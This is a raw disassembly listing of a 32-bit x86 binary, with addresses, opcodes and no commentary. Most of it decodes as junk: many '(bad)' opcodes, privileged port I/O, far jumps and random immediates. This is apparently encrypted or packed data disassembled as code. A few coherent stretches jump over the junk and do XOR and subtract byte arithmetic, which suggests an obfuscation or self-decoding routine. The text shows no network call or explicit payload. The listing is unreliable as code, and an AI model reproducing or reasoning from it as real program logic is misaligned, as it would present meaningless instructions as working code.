  406c35:	mov    esp,esi
  406c37:	cli    
  406c38:	or     BYTE PTR ds:0x8cf57096,0x5e
  406c3f:	icebp  
  406c40:	fucomip st,st(1)
  406c42:	and    ebx,eax
  406c44:	pusha  
  406c45:	mov    ecx,0x6d57d6ad
  406c4a:	fnstenv ds:0xb9a3ee29
  406c50:	out    0x2e,eax
  406c52:	out    dx,al
  406c53:	xchg   bp,ax
  406c55:	aaa    
  406c56:	mov    ebx,0x52d13e94
  406c5b:	mov    esi,0xac8293d7
  406c60:	jnp    0x406be2
  406c62:	dec    ebp
  406c63:	cmovns eax,esi
  406c66:	inc    ebx
  406c67:	sti    
  406c68:	mov    edx,DWORD PTR [edi]
  406c6a:	cmp    al,0xf4
  406c6c:	or     al,0xd0
  406c6e:	add    DWORD PTR ds:0x9dbd702f,edi
  406c74:	dec    esi
  406c75:	adc    BYTE PTR [edx-0x2736dee1],al
  406c7b:	xor    al,0xdb
  406c7d:	jg     0x406cd7
  406c7f:	mov    eax,0xc9f02454
  406c84:	test   al,0xce
  406c86:	loope  0x406cc2
  406c88:	sahf   
  406c89:	ss das 
  406c8b:	in     eax,0x5e
  406c8d:	test   al,0xe
  406c8f:	add    BYTE PTR [ecx],0xcc
  406c92:	push   ebx
  406c93:	sar    DWORD PTR [ebx],cl
  406c95:	stc    
  406c96:	je     0x406c2a
  406c98:	shl    BYTE PTR [eax-0x79],0xe1
  406c9c:	ins    DWORD PTR es:[edi],dx
  406c9d:	pop    edx
  406c9e:	(bad)  
  406c9f:	into   
  406ca0:	jns    0x406c94
  406ca2:	and    DWORD PTR [edi+0x1008ddc4],ebx
  406ca8:	outs   dx,BYTE PTR ds:[esi]
  406ca9:	xor    cl,cl
  406cab:	adc    DWORD PTR [ebx],edi
  406cad:	out    dx,eax
  406cae:	inc    ebp
  406caf:	imul   edi,DWORD PTR [esi+0x63d539c6],0x8a6ee13c
  406cb9:	mov    eax,ds:0xf0d54389
  406cbe:	sub    ecx,ebp
  406cc0:	adc    eax,0x37e12991
  406cc5:	pop    eax
  406cc6:	lock mov ds:0xff7f19ee,eax
  406ccc:	jne    0x406cc2
  406cce:	push   DWORD PTR [ebp-0x14]
  406cd1:	call   0x405aeb
  406cd6:	test   eax,eax
  406cd8:	je     0x40739d
  406cde:	lea    eax,[ebp-0x78]
  406ce1:	jmp    0x40702e
  406ce6:	enter  0xde98,0x5a
  406cea:	outs   dx,BYTE PTR ds:[esi]
  406ceb:	bound  edx,QWORD PTR [edx+esi*4-0x2d]
  406cef:	adc    eax,0xf956d985
  406cf4:	pop    esp
  406cf5:	ret    0xc7cb
  406cf8:	jo     0x406d6a
  406cfa:	and    BYTE PTR [ebp+0x70],bh
  406cfd:	jo     0x406cec
  406cff:	mov    ds:0xdfa74a0d,al
  406d04:	cwde   
  406d05:	(bad)  
  406d07:	mov    eax,ds:0x7dc0cab
  406d0c:	les    ebx,FWORD PTR ds:0x5699abf7
  406d12:	push   esp
  406d13:	mov    ch,0xa8
  406d15:	ror    BYTE PTR gs:[ecx+0x5942cea6],1
  406d1c:	(bad)  
  406d1d:	cs sub al,0xe4
  406d20:	push   ss
  406d21:	add    dl,al
  406d23:	fwait
  406d24:	sub    DWORD PTR [ebp-0xa],esp
  406d27:	imul   eax,DWORD PTR [edi],0xa
  406d2a:	call   0x32d8:0x8d9da07f
  406d31:	xor    cl,dh
  406d33:	mov    esp,0x823cdecd
  406d38:	or     BYTE PTR [ecx],al
  406d3a:	test   eax,0x18dbdcda
  406d3f:	push   eax
  406d40:	frstor [ebx+0x5b]
  406d43:	arpl   WORD PTR [ecx-0x7b4f4f45],ax
  406d49:	test   al,0x50
  406d4b:	xor    BYTE PTR [edx],ah
  406d4d:	cdq    
  406d4e:	ret    
  406d4f:	mov    ecx,0xc147ed47
  406d54:	fstp   TBYTE PTR [edx]
  406d56:	inc    ebx
  406d57:	lock out dx,al
  406d59:	cli    
  406d5a:	inc    esp
  406d5b:	call   0xb16c726d
  406d60:	jnp    0x406cf8
  406d62:	ret    
  406d63:	or     BYTE PTR [edx+0x48],dh
  406d66:	cmp    dl,al
  406d68:	sar    BYTE PTR [edx+0x6c6e7bf3],cl
  406d6e:	mov    BYTE PTR [edx+0x54323541],al
  406d74:	pushf  
  406d75:	stos   DWORD PTR es:[edi],eax
  406d76:	pop    esp
  406d77:	hlt    
  406d78:	js     0x406dc9
  406d7a:	mov    bh,0x36
  406d7c:	cmp    edi,DWORD PTR [ebx]
  406d7e:	or     BYTE PTR [esi],dh
  406d80:	retf   0xfab
  406d83:	int    0x17
  406d85:	mov    esi,0x83efed46
  406d8a:	jns    0x406da2
  406d8c:	adc    ah,cl
  406d8e:	sbb    eax,0x24944e1d
  406d93:	repnz push ebp
  406d95:	sub    al,BYTE PTR [esi+0x52ca8ba3]
  406d9b:	mov    ch,0x30
  406d9d:	pop    edx
  406d9e:	pop    edi
  406d9f:	jge    0x406dde
  406da1:	imul   bh
  406da3:	xchg   ebx,eax
  406da4:	fs xchg ecx,eax
  406da6:	ja     0x406d5f
  406da8:	mov    edi,DWORD PTR [eax+0x104e37b4]
  406dae:	adc    esi,ebp
  406db0:	loope  0x406d3a
  406db2:	xchg   ecx,eax
  406db3:	(bad)  
  406db5:	xchg   edx,eax
  406db6:	mov    cl,0xff
  406db8:	cmp    bl,BYTE PTR [ebx+0x275e0008]
  406dbe:	pop    esp
  406dbf:	mov    ah,dh
  406dc1:	mov    al,ds:0x469b55a8
  406dc6:	jae    0x406df8
  406dc8:	(bad)  
  406dc9:	cmp    eax,DWORD PTR [edi+0x3d5154e0]
  406dcf:	jle    0x406dc5
  406dd1:	retf   
  406dd2:	in     al,0x95
  406dd4:	sub    ecx,edx
  406dd6:	and    BYTE PTR [edx+edi*1+0x50],0xb0
  406ddb:	and    eax,0xfd0d1905
  406de0:	xchg   ecx,eax
  406de1:	test   BYTE PTR [eax-0x22],bh
  406de4:	aas    
  406de5:	ins    DWORD PTR es:[edi],dx
  406de6:	hlt    
  406de7:	jb     0x406d80
  406de9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dea:	cmp    al,0x42
  406dec:	inc    ebp
  406ded:	push   ss
  406dee:	jmp    0x22a50ad2
  406df3:	les    ecx,FWORD PTR [ebp+0x43455aaf]
  406df9:	add    DWORD PTR [edx+0x18],ebx
  406dfc:	ins    DWORD PTR es:[edi],dx
  406dfd:	jecxz  0x406e62
  406dff:	mov    dl,BYTE PTR [edx+0x76]
  406e02:	or     ebx,DWORD PTR [ebp+0xd1f8ca3]
  406e08:	mov    cl,0x5
  406e0a:	mov    esi,0x99b07b31
  406e0f:	push   eax
  406e10:	aam    0xa2
  406e12:	loopne 0x406e80
  406e14:	cmp    dh,BYTE PTR [ecx]
  406e16:	and    eax,0xda4f5cf1
  406e1b:	xchg   ebx,eax
  406e1c:	mov    cs,WORD PTR [edx]
  406e1e:	ss and eax,0xd458be00
  406e24:	cmp    BYTE PTR [esi+0x13],bh
  406e27:	frstor [eax-0x6d860499]
  406e2d:	mov    bl,0xb2
  406e2f:	cdq    
  406e30:	or     DWORD PTR ds:0x831f3167,ebp
  406e36:	pop    edx
  406e37:	fldcw  WORD PTR [ebx+esi*2]
  406e3a:	mov    eax,ds:0xc9224a4e
  406e3f:	arpl   WORD PTR [eax+edx*8+0x77acae68],bp
  406e46:	mov    eax,ds:0xcd7d619d
  406e4c:	int3   
  406e4d:	push   di
  406e4f:	js     0x406dd1
  406e51:	lods   al,BYTE PTR ds:[esi]
  406e52:	inc    ebp
  406e53:	mov    ecx,0xf9f2390f
  406e58:	jb     0x406e85
  406e5a:	hlt    
  406e5b:	mov    al,0xc4
  406e5d:	push   ss
  406e5e:	stos   DWORD PTR es:[edi],eax
  406e5f:	mov    ecx,0x35c20a1e
  406e64:	add    al,BYTE PTR [edi+0x4b39cec]
  406e6a:	inc    edx
  406e6b:	sbb    ch,0x8d
  406e6e:	fbstp  TBYTE PTR [eax]
  406e70:	push   es
  406e71:	jge    0xa155fca2
  406e77:	fcom   QWORD PTR [edi+0x5695648b]
  406e7d:	sbb    eax,0x849ad421
  406e82:	es inc ecx
  406e84:	xor    DWORD PTR [ebp-0x7e],ecx
  406e87:	stc    
  406e88:	scas   al,BYTE PTR es:[edi]
  406e89:	inc    esi
  406e8a:	repnz hlt 
  406e8c:	jb     0x406ed8
  406e8e:	sub    al,BYTE PTR [edx]
  406e90:	rcr    BYTE PTR [ecx-0x14],1
  406e93:	je     0x406e46
  406e95:	mov    ds:0xf762fffc,eax
  406e9a:	rcr    BYTE PTR [edx],0x6b
  406e9d:	mov    eax,ds:0x93aeea7a
  406ea2:	aas    
  406ea3:	mov    DWORD PTR [edi-0x14504147],edx
  406ea9:	cdq    
  406eaa:	push   ss
  406eab:	pop    eax
  406eac:	xchg   cl,bl
  406eae:	into   
  406eaf:	fst    QWORD PTR [eax]
  406eb1:	int3   
  406eb2:	js     0x406e5e
  406eb4:	push   0xdcf50bff
  406eb9:	stos   BYTE PTR es:[edi],al
  406eba:	ins    BYTE PTR es:[edi],dx
  406ebb:	add    eax,0x9296a692
  406ec0:	inc    eax
  406ec1:	jns    0x406f05
  406ec3:	loopne 0x406e62
  406ec5:	into   
  406ec6:	push   ds
  406ec7:	mov    ds:0x1ca1906a,al
  406ecc:	cmp    al,0x76
  406ece:	sub    DWORD PTR [edx-0x4a],ebx
  406ed1:	sar    DWORD PTR [edi+0x2f3e39dd],0xf5
  406ed8:	mov    ah,0x41
  406eda:	xor    BYTE PTR [edi],ch
  406edc:	retf   0xd5
  406edf:	inc    esi
  406ee0:	adc    eax,0x2f2a7fa0
  406ee5:	lahf   
  406ee6:	in     al,0xca
  406ee8:	div    BYTE PTR [edi+0x78fa0931]
  406eee:	mov    BYTE PTR [edi+eiz*4-0x3fc7a175],0x19
  406ef6:	xor    bh,BYTE PTR [ebx+0x36af8876]
  406efc:	add    cl,BYTE PTR [ecx-0x7b]
  406eff:	(bad)  
  406f00:	xlat   BYTE PTR ds:[ebx]
  406f01:	and    eax,0xf674fc26
  406f06:	jmp    0x287a:0xe4422bae
  406f0d:	sahf   
  406f0e:	pusha  
  406f0f:	jbe    0x406ec9
  406f11:	jmp    ebx
  406f13:	cdq    
  406f14:	cmp    cl,bh
  406f16:	lods   eax,DWORD PTR ds:[esi]
  406f17:	and    al,BYTE PTR [esi-0x8]
  406f1a:	and    eax,0xf458bf85
  406f1f:	int    0x3f
  406f21:	rol    BYTE PTR [ebp-0x5d83ae93],0xff
  406f28:	adc    BYTE PTR [edi],0xc7
  406f2b:	bound  ebx,QWORD PTR [ebp-0xfb340b8]
  406f31:	cmp    ecx,DWORD PTR [edx-0x583af911]
  406f37:	mov    al,ds:0x811b4f21
  406f3c:	jg     0x406f48
  406f3e:	dec    edx
  406f3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f40:	cs in  eax,dx
  406f42:	mov    bl,0x26
  406f44:	xchg   cl,cl
  406f46:	mov    ah,0x92
  406f48:	push   ds
  406f49:	nop
  406f4a:	adc    al,BYTE PTR [edi+0x52]
  406f4d:	dec    ecx
  406f4e:	ret    0x9f98
  406f51:	mov    eax,ds:0x6d3707b2
  406f56:	repnz and BYTE PTR [esi],bl
  406f59:	pop    edx
  406f5a:	lahf   
  406f5b:	jmp    0x918da7bc
  406f60:	mov    ebx,DWORD PTR [ecx-0x1d25bb32]
  406f66:	arpl   WORD PTR [ebp+0x7f],bx
  406f69:	xor    dh,ah
  406f6b:	clc    
  406f6c:	adc    eax,0xa1daf6c5
  406f71:	mov    ds:0x99e7aa6,eax
  406f76:	aad    0x74
  406f78:	stos   DWORD PTR es:[edi],eax
  406f79:	loop   0x406f47
  406f7b:	jae    0x406ffb
  406f7d:	add    BYTE PTR [ecx-0x10baba80],bh
  406f83:	adc    eax,0xe5ad1f8e
  406f88:	mov    WORD PTR [edx],gs
  406f8a:	inc    eax
  406f8b:	js     0x406f93
  406f8d:	(bad)  
  406f8e:	outs   dx,DWORD PTR ds:[esi]
  406f8f:	outs   dx,DWORD PTR ds:[esi]
  406f90:	jo     0x406ffc
  406f92:	repz inc ebx
  406f94:	mov    esp,0x67dbcefc
  406f99:	lds    edi,FWORD PTR [edx]
  406f9b:	mov    ebp,DWORD PTR [ebx]
  406f9d:	xchg   esi,eax
  406f9e:	(bad)  
  406f9f:	jo     0x406fd9
  406fa1:	dec    esi
  406fa2:	pushf  
  406fa3:	mov    eax,ds:0x1458a656
  406fa8:	adc    edx,DWORD PTR [ebx+ebp*1-0x4b]
  406fac:	pop    eax
  406fad:	cwde   
  406fae:	(bad)  
  406fb0:	push   ss
  406fb1:	jp     0x406fc1
  406fb3:	repnz xchg edx,eax
  406fb5:	inc    ebp
  406fb6:	(bad)  
  406fb7:	repz push esi
  406fb9:	je     0x406f89
  406fbb:	xchg   cl,dl
  406fbd:	test   DWORD PTR [esi+0x46dc3ce2],ebp
  406fc3:	imul   eax,DWORD PTR [ecx],0xcf4c3868
  406fc9:	addr16 int3 
  406fcb:	sbb    eax,0x78675a74
  406fd0:	inc    esp
  406fd1:	sub    eax,0x3eb280ef
  406fd6:	or     BYTE PTR [esi*8-0x39aae3be],ch
  406fdd:	mov    esi,0xa86dc5a9
  406fe2:	and    edi,DWORD PTR [ecx-0x57985572]
  406fe8:	in     al,dx
  406fe9:	(bad)  
  406fea:	repnz ins BYTE PTR es:[edi],dx
  406fec:	and    ch,BYTE PTR [ecx-0x4e]
  406fef:	xchg   esi,eax
  406ff0:	mov    dl,0x19
  406ff2:	stos   BYTE PTR es:[edi],al
  406ff3:	loope  0x406fcc
  406ff5:	test   eax,0x26c061d9
  406ffa:	test   DWORD PTR [ecx+edx*1+0x38ee0c0f],0x2eb0accc
  407005:	mov    edx,0xf04aa3f0
  40700a:	pop    edx
  40700b:	test   esp,esp
  40700d:	jle    0x406fb4
  40700f:	inc    edi
  407010:	cmp    DWORD PTR [eax+ebp*2-0x37],ecx
  407014:	(bad)  
  407015:	int3   
  407016:	loop   0x406ff5
  407018:	shl    BYTE PTR gs:[eax],cl
  40701b:	inc    edx
  40701c:	adc    ecx,DWORD PTR [edi-0x3ba42715]
  407022:	push   eax
  407023:	add    eax,0x85715d5
  407028:	xchg   ebp,eax
  407029:	clc    
  40702a:	jae    0x406fd8
  40702c:	rcr    DWORD PTR [eax+edx*2],0x8b
  407030:	inc    ebp
  407031:	in     al,dx
  407032:	xor    eax,esi
  407034:	add    eax,edi
  407036:	push   eax
  407037:	mov    eax,DWORD PTR [ebp-0x10]
  40703a:	add    eax,0xee
  40703f:	push   eax
  407040:	mov    eax,DWORD PTR [ebp-0x10]
  407043:	jmp    0x407390
  407048:	inc    esp
  407049:	jmp    edx
  40704b:	cwde   
  40704c:	loope  0x4070af
  40704e:	inc    edx
  40704f:	pop    ebx
  407050:	(bad)  
  407051:	mov    dh,0x44
  407053:	mov    esi,0xeca26632
  407058:	sti    
  407059:	les    esi,FWORD PTR [eax+0x70]
  40705c:	and    BYTE PTR [ebp+0x70],bh
  40705f:	jo     0x406fee
  407061:	pop    eax
  407062:	daa    
  407063:	push   ebx
  407064:	jae    0x40706b
  407066:	mov    esp,0x385be0b2
  40706b:	hlt    
  40706c:	jl     0x4070b7
  40706e:	and    ebx,DWORD PTR [ecx+0x4cf6d923]
  407074:	lods   eax,DWORD PTR ds:[esi]
  407075:	xchg   DWORD PTR [ebx+0x30ef7e69],eax
  40707b:	or     BYTE PTR [eax-0x5e4319f0],cl
  407081:	jae    0x40708b
  407083:	mul    ch
  407085:	fs jae 0x40709f
  407088:	xchg   esp,esp
  40708a:	and    al,0xb0
  40708c:	push   cs
  40708d:	or     eax,0x40c5ed8b
  407092:	ja     0x40710d
  407094:	scas   eax,DWORD PTR es:[edi]
  407095:	pop    ds
  407096:	adc    ch,BYTE PTR ss:[edi+0x43dc477b]
  40709d:	or     DWORD PTR [ecx+0x1b],ebp
  4070a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070a1:	test   eax,0xc052bbe4
  4070a6:	mov    ds:0x8dc9a8b1,al
  4070ab:	jo     0x4070b9
  4070ad:	sbb    eax,0xf8db1e97
  4070b2:	mov    BYTE PTR [edx-0x5063df26],bl
  4070b8:	and    al,0x7e
  4070ba:	nop
  4070bb:	mov    bh,0xf1
  4070bd:	inc    esp
  4070be:	aam    0x1
  4070c0:	imul   ebp,ecx,0x9b6d93c8
  4070c6:	mov    esp,0x286b6278
  4070cb:	jmp    0x40712d
  4070cd:	dec    ecx
  4070ce:	imul   edx,edi,0x60
  4070d1:	sahf   
  4070d2:	mov    bl,0x2d
  4070d4:	adc    BYTE PTR ds:0x5d6b02f1,cl
  4070da:	lea    esi,[esi+esi*2-0x2c]
  4070de:	cli    
  4070df:	push   ds
  4070e0:	and    al,0x38
  4070e2:	sub    BYTE PTR [edx-0x4e],ah
  4070e5:	cmp    DWORD PTR [edx-0x7b],0xee001eda
  4070ec:	xor    BYTE PTR [edi+0x12],0x3b
  4070f0:	je     0x40708f
  4070f2:	(bad)
  4070f6:	xchg   DWORD PTR [ebx-0x1c],esp
  4070f9:	sti    
  4070fa:	(bad)  
  4070fb:	loope  0x407139
  4070fd:	shl    BYTE PTR [esi],cl
  4070ff:	pop    ebx
  407100:	xor    BYTE PTR [ecx-0x9db96a0],ah
  407106:	xchg   ecx,eax
  407107:	icebp  
  407108:	jg     0x4070ca
  40710a:	sub    ch,bh
  40710c:	and    eax,0xd16e999e
  407111:	pop    ds
  407112:	xor    dl,bh
  407114:	(bad)  
  407115:	push   0xffffffe6
  407117:	(bad)  
  407118:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407119:	push   edi
  40711a:	sbb    al,0x98
  40711c:	sbb    eax,0xf6c3d72d
  407121:	retf   
  407122:	jns    0x4070c9
  407124:	xchg   esi,eax
  407125:	dec    ebp
  407126:	sbb    BYTE PTR [ebx+ebp*1],dh
  407129:	fild   DWORD PTR [edi-0x6b]
  40712c:	cmp    DWORD PTR [eax+0x2d],edx
  40712f:	lahf   
  407130:	into   
  407131:	test   BYTE PTR [ecx-0x71],0x26
  407135:	inc    edx
  407136:	out    0x76,al
  407138:	int3   
  407139:	mov    ds:0x7dba960b,eax
  40713e:	pop    ebx
  40713f:	cwde   
  407140:	lods   al,BYTE PTR ds:[esi]
  407141:	push   ds
  407142:	pop    ebp
  407143:	lods   al,BYTE PTR ds:[esi]
  407144:	inc    esi
  407145:	jmp    0xefda:0x9cf7b3c4
  40714c:	push   esi
  40714d:	sub    eax,0x226cf42d
  407152:	jae    0x407133
  407154:	xlat   BYTE PTR ds:[ebx]
  407155:	and    eax,0x34a106b2
  40715a:	cmp    BYTE PTR [ebx+0x47d88ab5],ch
  407160:	icebp  
  407161:	xor    ebp,esp
  407163:	in     al,dx
  407164:	sub    eax,0xec0dcd6f
  407169:	mov    bh,0x39
  40716b:	jno    0x40719b
  40716d:	adc    ebp,eax
  40716f:	dec    esi
  407170:	adc    ch,ch
  407172:	sbb    al,0x3
  407174:	popa   
  407175:	mov    ds:0x1b3d0ce4,eax
  40717a:	pop    ebx
  40717b:	cli    
  40717c:	mov    edi,0x5867adc2
  407181:	test   BYTE PTR [edx-0xa],al
  407184:	in     al,0xc4
  407186:	cli    
  407187:	or     BYTE PTR [esi],cl
  407189:	inc    edx
  40718a:	(bad)  
  40718b:	dec    edi
  40718c:	test   eax,0x87a4653c
  407191:	fadd   st,st(0)
  407193:	adc    al,0x4e
  407195:	aad    0xf5
  407197:	popf   
  407198:	mov    al,ds:0x38764049
  40719d:	jl     0x4071e8
  40719f:	test   al,0x58
  4071a1:	mov    ebp,0xbb473a86
  4071a6:	inc    esp
  4071a7:	pushf  
  4071a8:	xchg   BYTE PTR [ebx],bl
  4071aa:	aas    
  4071ab:	cmp    DWORD PTR [ebx+0x11],esi
  4071ae:	ins    BYTE PTR es:[edi],dx
  4071af:	or     eax,0x3a0e8edf
  4071b4:	mov    al,ds:0x3fffc40c
  4071b9:	call   DWORD PTR [esi-0x2cc2a146]
  4071bf:	cmp    ecx,DWORD PTR [esi]
  4071c1:	inc    esi
  4071c2:	push   ebx
  4071c3:	mov    DWORD PTR [ebp-0x38],ebp
  4071c6:	adc    edx,DWORD PTR [ebx+eiz*2]
  4071c9:	push   ds
  4071ca:	push   ecx
  4071cb:	and    eax,ebp
  4071cd:	add    bh,BYTE PTR [ebx-0x6d7df2af]
  4071d3:	iret   
  4071d4:	ja     0x4071ba
  4071d6:	push   cs
  4071d7:	(bad)  
  4071d9:	in     al,dx
  4071da:	push   eax
  4071db:	cmp    cl,BYTE PTR [esi]
  4071dd:	sahf   
  4071de:	add    DWORD PTR ds:0x7a16132e,esi
  4071e4:	test   dl,cl
  4071e6:	ins    BYTE PTR es:[edi],dx
  4071e7:	jbe    0x407220
  4071e9:	ja     0x40716f
  4071eb:	test   BYTE PTR [ecx],ah
  4071ed:	aas    
  4071ee:	sub    al,bl
  4071f0:	repnz mov esp,0xfde3d832
  4071f6:	call   0x29f8:0x4f4cb949
  4071fd:	les    esi,FWORD PTR [ecx+eiz*2+0x6b1fe0d5]
  407204:	cmp    DWORD PTR [esi+0x7143d26d],edi
  40720a:	enter  0xeb27,0xf3
  40720e:	xchg   ebp,eax
  40720f:	es sahf 
  407211:	add    ebp,esp
  407213:	out    dx,eax
  407214:	mov    bh,0x90
  407216:	or     al,0x2d
  407218:	aam    0xde
  40721a:	jno    0x40727e
  40721c:	int    0x79
  40721e:	adc    BYTE PTR [ebp+0x9],al
  407221:	in     al,0xe4
  407223:	dec    edx
  407224:	mov    esp,0xec4088af
  407229:	fstp   QWORD PTR gs:[ebx+0x2c]
  40722d:	repz jnp 0x407231
  407230:	jae    0x4071fa
  407232:	in     al,dx
  407233:	xchg   ebp,eax
  407234:	popf   
  407235:	pop    DWORD PTR [eax]
  407237:	mov    BYTE PTR [eax+0x63],dh
  40723a:	rcl    DWORD PTR [ebx],1
  40723c:	add    eax,0x8306e0e5
  407241:	sbb    DWORD PTR [edi-0x5b],0x28
  407245:	push   ebx
  407246:	inc    ecx
  407247:	(bad)  
  407248:	(bad)  
  407249:	and    dl,BYTE PTR [esi-0x56]
  40724c:	fist   WORD PTR [ecx]
  40724e:	mov    bh,0x1b
  407250:	xchg   DWORD PTR [ecx],ebp
  407252:	test   DWORD PTR [ebp-0x44c8075e],edi
  407258:	imul   ebx,esi,0x43
  40725b:	mov    esi,0xf0a30460
  407260:	rcl    ch,0x87
  407263:	es scas al,BYTE PTR es:[edi]
  407265:	jmp    0xba3849c
  40726a:	loop   0x40724b
  40726c:	inc    ebx
  40726d:	or     bh,ah
  40726f:	mov    cl,0x10
  407271:	push   0xbdf26afb
  407276:	mov    ?,WORD PTR [esi+0x13]
  407279:	aas    
  40727a:	sbb    al,0xb7
  40727c:	dec    eax
  40727d:	or     al,0xff
  40727f:	add    al,0xaa
  407281:	fild   WORD PTR [edi+0x48468ab]
  407287:	and    BYTE PTR [ebx-0x25],dl
  40728a:	dec    ebp
  40728b:	mov    bl,0x64
  40728d:	jnp    0x4072fe
  40728f:	into   
  407290:	addr16 jle 0x407263
  407293:	jbe    0x407289
  407295:	or     eax,0xaaebbf1c
  40729a:	mov    bl,0x66
  40729c:	jno    0x4072ef
  40729e:	daa    
  40729f:	sar    BYTE PTR [ecx-0x73],cl
  4072a2:	sbb    BYTE PTR [ecx-0x27],cl
  4072a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072a6:	mov    ebx,0x581dec7a
  4072ab:	neg    DWORD PTR [edi+0x2d659f4f]
  4072b1:	mov    ebx,esi
  4072b3:	or     eax,0xf17d2e45
  4072b8:	cmp    BYTE PTR [ebp+0x404dfcb7],0x3a
  4072bf:	adc    BYTE PTR [edi+0x3d3c37e5],bl
  4072c5:	dec    ebp
  4072c6:	mov    DWORD PTR [edi+edx*4+0x1d],edx
  4072ca:	jp     0x4072dc
  4072cc:	jecxz  0x40731c
  4072ce:	nop
  4072cf:	jmp    0x4cfc33a6
  4072d4:	push   esi
  4072d5:	jo     0x407298
  4072d7:	popf   
  4072d8:	stos   DWORD PTR es:[edi],eax
  4072d9:	lds    ebp,FWORD PTR [esi+0x6d8b9782]
  4072df:	xchg   bl,cl
  4072e1:	lods   al,BYTE PTR ds:[esi]
  4072e2:	mov    bh,0x1c
  4072e4:	clc    
  4072e5:	je     0x407340
  4072e7:	fidiv  DWORD PTR [ebp-0x1488bb8]
  4072ed:	repnz mov ds:0x425ad134,eax
  4072f3:	cld    
  4072f4:	sbb    BYTE PTR [esi+eax*4+0x765d444e],bh
  4072fb:	and    edi,ebp
  4072fd:	ins    DWORD PTR es:[edi],dx
  4072fe:	pop    DWORD PTR [ecx-0x5d]
  407301:	pop    esp
  407302:	not    DWORD PTR [esi+edi*1+0x14]
  407306:	das    
  407307:	dec    ebx
  407308:	jmp    0x474e:0x3ee6383f
  40730f:	mov    esi,0x5a9004ef
  407314:	push   eax
  407315:	es in  eax,dx
  407317:	mov    BYTE PTR [eax-0x12],0xa7
  40731b:	xor    al,0xa7
  40731d:	or     DWORD PTR [ebx],ebx
  40731f:	pop    es
  407320:	add    eax,0x255a9bc4
  407325:	pop    esp
  407326:	stos   BYTE PTR es:[edi],al
  407327:	jmp    0x1bed:0xadc78c86
  40732e:	add    ebx,esp
  407330:	and    edi,DWORD PTR [eax-0x3a]
  407333:	je     0x4073ad
  407335:	xchg   esi,eax
  407336:	int    0x39
  407338:	or     DWORD PTR [ebx],ebx
  40733a:	jnp    0x40730e
  40733c:	and    DWORD PTR [edx],edi
  40733e:	iret   
  40733f:	popf   
  407340:	test   BYTE PTR [ebp+0x7392e161],bh
  407346:	lods   eax,DWORD PTR ds:[esi]
  407347:	xor    ch,BYTE PTR [edi+0x2a]
  40734a:	mov    ecx,0x90144015
  40734f:	push   cs
  407350:	or     DWORD PTR [ebp+eiz*2+0x5e],ebx
  407354:	cld    
  407355:	cmp    al,0x95
  407357:	loop   0x40736c
  407359:	hlt    
  40735a:	ja     0x407343
  40735c:	dec    edi
  40735d:	mov    ah,0x52
  40735f:	retf   
  407360:	fisttp WORD PTR [esi-0x4c]
  407363:	pop    ebx
  407364:	fcmovu st,st(3)
  407366:	jge    0x4072eb
  407368:	jae    0x407343
  40736a:	ja     0x40734b
  40736c:	dec    edx
  40736d:	mov    bh,0x5a
  40736f:	dec    esi
  407370:	out    0x31,al
  407372:	cmp    eax,0x87d33ee4
  407377:	pop    edi
  407378:	outs   dx,BYTE PTR ds:[esi]
  407379:	imul   edi,DWORD PTR [edx+0x25],0xa912025d
  407380:	cmp    eax,0x34dcf17d
  407385:	es cs (bad) 
  407388:	call   DWORD PTR [ebp-0x708c45fd]
  40738e:	(bad)  
  40738f:	sbb    ecx,DWORD PTR [ebx+0x19880]
  407395:	add    bh,bh
  407397:	xor    al,ch
  407399:	fstp   DWORD PTR [eax+eax*1+0x0]
  40739d:	mov    ecx,DWORD PTR [ebp-0x1c]
  4073a0:	xor    ecx,esi
  4073a2:	mov    eax,0xffcd8d64
  4073a7:	sub    eax,ecx
  4073a9:	sub    eax,DWORD PTR [ebp-0x8]
  4073ac:	mov    ecx,DWORD PTR [ebp-0x30]
  4073af:	add    ecx,eax
  4073b1:	mov    eax,DWORD PTR [ebp-0x8]
  4073b4:	mov    DWORD PTR [eax+0x1],ecx
  4073b7:	mov    al,BYTE PTR [ebp-0x1]
  4073ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bd:	xor    al,0x47
  4073bf:	sub    al,0x37
  4073c1:	mov    BYTE PTR [ecx],al
  4073c3:	lea    eax,[ebp-0x8]
  4073c6:	inc    BYTE PTR [eax]
  4073c8:	inc    eax
  4073c9:	push   eax
  4073ca:	pop    ecx
  4073cb:	dec    ecx
  4073cc:	xchg   ecx,edx
  4073ce:	jmp    0x40771b
  4073d3:	sub    BYTE PTR [esi],ah
  4073d5:	cs cdq 
  4073d7:	cs mov cl,0xb3
  4073da:	mov    cl,0x3e
  4073dc:	sbb    ebp,edx
  4073de:	into   
  4073df:	and    dl,cl
  4073e1:	out    0x53,eax
  4073e3:	stos   DWORD PTR es:[edi],eax
  4073e4:	shl    DWORD PTR [eax+0x70],0x20
  4073e8:	jge    0x40745a
  4073ea:	jo     0x4073bc
  4073ec:	in     eax,0xd1
  4073ee:	hlt    
  4073ef:	jp     0x407413
  4073f1:	cmp    al,0xdc
  4073f3:	jl     0x40740d
  4073f5:	push   0x5e
  4073f7:	dec    edx
  4073f8:	push   ecx
  4073f9:	(bad)  
  4073fa:	mov    esp,0xbb7a7462
  4073ff:	leave  
  407400:	xadd   al,cl
  407403:	cld    
  407404:	sbb    al,0x78
  407406:	xor    ebx,ecx
  407408:	adc    DWORD PTR [eax-0x55184cbc],edx
  40740e:	jecxz  0x407479
  407410:	lock daa 
  407412:	or     ebx,edx
  407414:	xchg   edx,eax
  407415:	mov    bh,0x1f
  407417:	sbb    al,0x9e
  407419:	in     al,0xf6
  40741b:	stos   BYTE PTR es:[edi],al
  40741c:	sti    
  40741d:	pop    ecx
  40741e:	imul   ebx,DWORD PTR [eax+0x494d9e6b],0xd7a958ab
  407428:	jmp    0x100:0x80c3e40c
  40742f:	xor    al,0x11
  407432:	sub    eax,0x75da4ccd
  407437:	cmp    al,BYTE PTR [ecx+0x1800b3fb]
  40743d:	mov    dh,BYTE PTR gs:[esi]
  407440:	idiv   BYTE PTR [ebx+0x59]
  407443:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407444:	and    eax,0xce55eb72
  407449:	and    DWORD PTR [ecx-0x3afbd4d3],eax
  40744f:	es pop edx
  407451:	rcl    DWORD PTR [eax-0x3d],1
  407454:	ror    DWORD PTR [ecx+0x18a206c2],cl
